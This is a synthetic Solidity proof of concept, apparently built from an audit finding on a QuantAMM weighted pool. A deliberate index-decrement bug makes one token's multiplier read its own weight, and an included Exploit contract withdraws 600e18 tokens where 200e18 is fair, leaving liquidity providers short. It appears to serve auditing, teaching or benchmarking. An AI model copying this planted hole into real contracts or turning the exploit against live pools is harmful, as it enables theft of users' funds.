// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  QuantAMM — tokenIndex -= 4 makes token 4's multiplier equal its weight
    (Cyfrin, Dec 2024). SYNTHETIC, cheatcode-free.
    secondFourWeights[tokenIndex] should be the multiplier at index 4.
    After the decrement it is secondFourWeights[0], the weight itself.
    A withdrawal then pays 600e18 of token 4 instead of the fair 200e18. (@> VULN) */

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // S5
        balanceOf[to] += amount;
        return true;
    }
}

contract QuantAMMWeightedPool {
    MockToken public token4;
    uint256 public reserve4;
    uint256 public nTokens;
    uint256 public constant TIME = 2;

    constructor(MockToken t) {
        token4 = t;
        reserve4 = 1000e18;
        nTokens = 5;
    }

    function mulDown(uint256 a, uint256 b) public pure returns (uint256) {
        return (a * b) / 1e18;
    }

    function calculateBlockNormalisedWeight(int256 weight, int256 multiplier, uint256 timeSinceLastUpdate)
        public
        pure
        returns (uint256)
    {
        int256 multiplierScaled18 = multiplier * int256(1e18);
        if (multiplier > 0) {
            return uint256(weight) + mulDown(uint256(multiplierScaled18), timeSinceLastUpdate);
        } else {
            return uint256(weight) - mulDown(uint256(-multiplierScaled18), timeSinceLastUpdate);
        }
    }

    function shiftIndex(uint256 tokenIndex) public pure returns (uint256) {
        return tokenIndex - 4; // @> VULN: S3 resets the multiplier index to 0, so weight and multiplier are the same slot
    }

    function _getNormalizedWeights() public view returns (uint256[] memory normalizedWeights) {
        uint256 totalTokens = nTokens;
        uint256 timeSinceLastUpdate = TIME;
        normalizedWeights = new uint256[](totalTokens);
        uint256 tokenIndex = totalTokens;
        if (totalTokens > 4) {
            tokenIndex = 4;
        }
        int256[] memory firstFourWeights = new int256[](8);
        firstFourWeights[0] = 2e17;
        firstFourWeights[4] = 0;
        normalizedWeights[0] = calculateBlockNormalisedWeight(firstFourWeights[0], firstFourWeights[tokenIndex], timeSinceLastUpdate);
        if (totalTokens > 4) {
            tokenIndex = this.shiftIndex(tokenIndex);
            int256[] memory secondFourWeights = new int256[](8);
            secondFourWeights[0] = 2e17;
            secondFourWeights[4] = 0;
            normalizedWeights[4] = calculateBlockNormalisedWeight(secondFourWeights[0], secondFourWeights[tokenIndex], timeSinceLastUpdate); // S4
        }
    }

    function withdrawToken4() external returns (uint256 out) {
        uint256[] memory w = _getNormalizedWeights(); // S2
        out = (reserve4 * w[4]) / 1e18;
        token4.transfer(msg.sender, out);
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    QuantAMMWeightedPool public pool; // nonce 2

    uint256 public paid;
    uint256 public fairWeight;
    uint256 public buggyWeight;

    constructor() {
        token = new MockToken();
        pool = new QuantAMMWeightedPool(token);
        token.mint(address(pool), 1000e18);
    }

    function run() external {
        paid = pool.withdrawToken4(); // S1
        fairWeight = 2e17;
        buggyWeight = pool._getNormalizedWeights()[4]; // S6
        require(buggyWeight == 6e17, "buggy weight");
        require(paid == 600e18, "paid");
        require(paid > (1000e18 * fairWeight) / 1e18, "no excess");
        require(token.balanceOf(address(this)) == paid, "attacker received token4");
        require(token.balanceOf(address(pool)) == 400e18, "LPs left with less than the fair 800");
    }
}
